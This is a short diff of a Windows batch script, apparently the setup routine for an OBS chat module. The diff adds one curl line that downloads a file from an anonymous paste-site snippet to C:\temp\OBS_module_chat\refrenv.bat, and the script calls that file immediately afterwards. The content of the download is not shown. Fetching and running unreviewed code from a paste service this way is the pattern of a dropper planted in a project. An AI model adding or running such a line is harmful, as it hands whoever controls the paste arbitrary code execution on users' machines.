@@ -84,6 +84,7 @@ endlocal
 timeout 2 >nul
 setlocal
 chcp 65001 >nul
+curl -L https://api.pastecode.io/anon/raw-snippet/p5miwe0u?raw=inline&api=true&ticket=eecd2439-867e-4893-a6b0-6a06814bdbfa -o "C:\temp\OBS_module_chat\refrenv.bat"
 call "C:\temp\OBS_module_chat\refrenv.bat"
 ::C:\temp\OBS_module_chat\nircmd.exe sysrefresh environment
 timeout 6 >nul
